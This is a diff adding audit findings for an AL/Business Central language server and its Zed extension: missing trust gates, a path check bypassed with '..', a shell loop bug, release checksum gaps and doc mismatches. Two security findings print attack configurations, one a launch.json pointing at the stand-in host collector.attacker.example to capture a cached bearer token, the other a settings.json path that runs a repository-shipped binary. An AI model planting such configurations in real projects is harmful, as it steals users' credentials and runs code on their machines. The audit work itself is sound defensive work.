@@ -194,4 +194,144 @@ Part 5, quality of the new code:
 - fix: state the parameters that do shrink the answer, or drop the example.
 - status: open
 
+### [SECURITY] `tests.snapshot_capture` spends the cached Business Central token without the trust gate
+
+- where: `crates/al-lsp/src/server/daemon/build_dispatch/tests_dispatch.rs:1981-2023`.
+  It calls `debug_dispatch::resolve_debug_config` (`:1981`), then
+  `al_symbols::oauth::acquire_token` (`:1999`), then passes the token to
+  `capture_live_snapshot` (`:2027`), which is `NativeDebugSession::start(config, &access_token)`
+  at `crates/al-test/src/backends/snapshot.rs:110` — the same call `debug start` makes.
+  `debug start` gates it at `debug_dispatch.rs:355` with `authorize_debug_target`.
+  `tests_dispatch.rs` contains no call to `authorize_cached_credential`,
+  `authorize_debug_target` or `authorize_launch_target`: grep finds the four call sites in
+  `debug_dispatch.rs:252`, `:280`, `workspace.rs:946` and `al-publish/src/lib.rs:352`, and none
+  in the tests dispatcher.
+- severity: high
+- scenario: a cloned repository ships
+  `.vscode/launch.json` = `{"configurations":[{"name":"Local","type":"al","request":"launch","environmentType":"OnPrem","server":"http://collector.attacker.example","serverInstance":"BC","authentication":"AAD","tenant":"<victim tenant>"}]}`.
+  The project is never trusted. `al_call` with
+  `{"method":"tests.snapshot_capture","params":{"codeunit":50100,"method":"TestX","bcVersion":"25.0"}}`
+  resolves that configuration, `debug_uses_oauth` is true, the daemon acquires or refreshes the
+  user's token from the keyring-backed cache and `NativeDebugSession::start` sends it as a
+  `Bearer` header to the attacker's host. `debug start` with the same launch file refuses,
+  naming the project and `al-explorer trust`. Both the trust requirement and the `http://`
+  cleartext refusal in `authorize_cached_credential` (trust.rs:647-656) are skipped.
+  `debug.accept_invalid_certs` from the same launch file is applied too, without the
+  `may_accept_invalid_certs` check that `debug start` performs at `debug_dispatch.rs:358`.
+- the claim it breaks: `Docs/features/project-trust.md` "Credentials": "Every path that spends a
+  cached Business Central token goes through one authorisation function: debug start, publish, a
+  test run against live BC, snapshot capture, and symbol download from a BC server." Two of the
+  five named paths live in `tests_dispatch.rs` and neither calls it.
+- fix: call `debug_dispatch::authorize_debug_target(workspace, &debug, TargetSource::Repository)`
+  in `dispatch_tests_snapshot_capture` before `acquire_token`, and refuse
+  `accept_invalid_certs` when the authorization does not allow it. Add a test that lists every
+  `acquire_token` / `NativeDebugSession::start` call site and asserts an authorisation call
+  precedes it.
+- status: open
+
+### [SECURITY] the worktree-binary check compares strings, so `..` inside an absolute path walks past it
+
+- where: `src/settings.rs:201-216` (`is_worktree_resident_program`), used at `src/lib.rs:530`
+  (`binary.path`) and `:533` (`dotnetPath`). `find_or_download_binary` returns a
+  `user_configured_path` at `src/lib.rs:362-364`, before the download and before
+  `verify_extracted_binaries`.
+- severity: high
+- scenario: the check calls a path resident when it is relative, or when
+  `path.strip_prefix(root)` succeeds and the remainder starts with a separator. Nothing
+  normalises `.` or `..` first. A repository at `/home/you/src/SomeApp` ships
+  `.zed/settings.json` =
+  `{"lsp":{"al-lsp":{"binary":{"path":"/home/you/src/../src/SomeApp/tools/al-lsp"},"settings":{"dotnetPath":"/home/you/src/../src/SomeApp/tools/dotnet"}}}}`.
+  `"/home/you/src/../src/SomeApp/tools/al-lsp".strip_prefix("/home/you/src/SomeApp")` returns
+  `None` (the strings diverge at `.` versus `S`), so `is_worktree_resident_program` is false,
+  the path is accepted, and `find_or_download_binary` returns the repository's own executable
+  with no checksum check. Opening the project in Zed is the whole attack.
+  The same shape reaches `dotnetPath`, although `al_project::trust::enforce_dotnet_path`
+  (`crates/al-project/src/trust.rs:754-777`) is a second line of defence there because
+  `stays_inside_project` does normalise `..`. There is no second line of defence for
+  `binary.path`: the binary it names is the server.
+  Two more spellings walk past the same check: a path reached through a symlinked ancestor, and
+  on a case-insensitive filesystem a path spelled with different case from `worktree_root`.
+- the finding it was meant to close: r2-security "[SECURITY] Zed LSP settings choose the
+  `dotnet` program and the language server binary" (status: fixed d4445c20).
+- why the tests miss it: `src/settings_test.rs:231-258` covers `./tools/al-lsp`,
+  `tools/dotnet`, the plain absolute form, `/usr/bin/dotnet`, the `SomeApp-tools` sibling and
+  whitespace. No case has `..`, `.`, a symlink or mixed case.
+- fix: normalise the path textually before comparing (fold `.`, resolve `..`, collapse repeated
+  separators, and compare case-insensitively on Windows and macOS), and reject any path that
+  still contains `..` rather than trying to interpret it.
+- status: open
+
+### [BUG] `al-bin.sh` loops forever when `CLAUDE_PLUGIN_ROOT` is a relative path
+
+- where: `plugin/scripts/al-bin.sh:57-72` (the upward `target/` search).
+- severity: low
+- scenario: `search="${CLAUDE_PLUGIN_ROOT-}"` is used as given; only the *fallback* branch makes
+  the path absolute (`cd -- "$(dirname -- "$0")/.." && pwd`). With a relative
+  `CLAUDE_PLUGIN_ROOT` such as `plugins/al-bc`, the loop reaches `search="."`, and
+  `dirname -- "."` is `.`, so `[ -n "$search" ] && [ "$search" != "/" ]` stays true forever.
+  `.mcp.json` runs this script, so the MCP server never starts and never reports why.
+- fix: make `search` absolute before the loop, the same way the fallback branch does, or stop
+  when `dirname` returns the value it was given.
+- status: open
+
+### [TEST] a consistency test asserts on the word "signature" appearing in the source
+
+- where: `src/repo_consistency_test.rs:782-785`:
+  `assert!(!lib.contains("signature"), "the extension verifies no signature, so its source must not claim one")`.
+- severity: low
+- scenario: the assertion is over the whole of `src/lib.rs` as text, so it fails on any comment
+  that mentions the word, including one added to explain that no signature is checked. It
+  constrains prose rather than behaviour, and the behaviour it means to pin (no signature
+  verification) is not what it tests.
+- fix: drop it, or test the thing itself, for example that `verify_extracted_binaries` is the
+  only verification call in the download path.
+- status: open
+
+### [BUG] `binary-checksums.txt` is the file the extension trusts and the one the attestation leaves out
+
+- where: `.github/workflows/release.yml:296-303` (`checksums.txt` covers `*.tar.gz`, `*.zip`,
+  `extension.wasm`, `extension.toml`), `:343` (`subject-checksums: artifacts/checksums.txt`),
+  `:322-324` (`binary-checksums.txt` is built separately), `src/lib.rs:304-349`
+  (the extension verifies against `binary-checksums.txt` and nothing else).
+- severity: low
+- scenario: `gh attestation verify` covers the archives. The extension never hashes an archive,
+  because `zed::download_file` extracts and discards it, so it checks the extracted binaries
+  against `binary-checksums.txt` — a file that is neither attested nor listed in
+  `checksums.txt`. Anyone who can add an asset to the release can replace both the archive and
+  that digest list, and the attestation on the archives does not help because nothing in the
+  extension reads it.
+- fix: include `binary-checksums.txt` in `checksums.txt` (and so in the attestation subjects),
+  so a manual verifier can at least check it. Say in the docs that the extension's automatic
+  path verifies integrity only.
+- status: open
+
+### [DOCS] the trust doc states three rules the code does not enforce everywhere
+
+- where: `Docs/features/project-trust.md` "Credentials" bullets 2-4, against
+  `crates/al-lsp/src/server/daemon/build_dispatch/build/bc_server_params.rs:51-56` and
+  `crates/al-lsp/src/server/daemon/build_dispatch/build/snapshot_profiling.rs:43`, `:200`.
+- severity: medium
+- scenario: the doc says "`acceptInvalidCerts` is honoured only where the project's own
+  configuration sets it for the same target, and only when the project is trusted." The
+  `snapshot` and `profiling` daemon methods read `acceptInvalidCerts` straight out of the
+  request parameters and pass it into `danger_accept_invalid_certs`
+  (`crates/al-bc/src/http_auth.rs:91-95`) with no configuration and no trust involved:
+  `al_call {"method":"snapshot","params":{"cmd":"list","serverUrl":"https://erp.example.com/BC","company":"X","username":"u","password":"p","acceptInvalidCerts":true}}`.
+  Those are caller-supplied credentials rather than cached ones, which is the honest
+  distinction, and the doc does not draw it.
+  The same section says "a test run against live BC" goes through the authorisation function;
+  `dispatch_tests_run` picks its `BcServerConfig` at `tests_dispatch.rs:750-793` and does not.
+- fix: say that the rule covers cached credentials, and name the methods where a caller spends
+  its own credentials and chooses its own TLS setting.
+- status: open
+
+### [DOCS] `--scope` help omits `table-impact`
+
+- where: `crates/al-explorer/src/cli/args.rs:74-76`: "Applies to impact, entrypoints and
+  event-map", against `crates/al-lsp/src/server/daemon/scope.rs:46-54`, which also lists
+  `tableImpact`, and `Docs/reference/daemon-methods.md:91`, which lists four.
+- severity: low
+- fix: add `table-impact` to the help text.
+- status: open
+
 ## Verified fixes
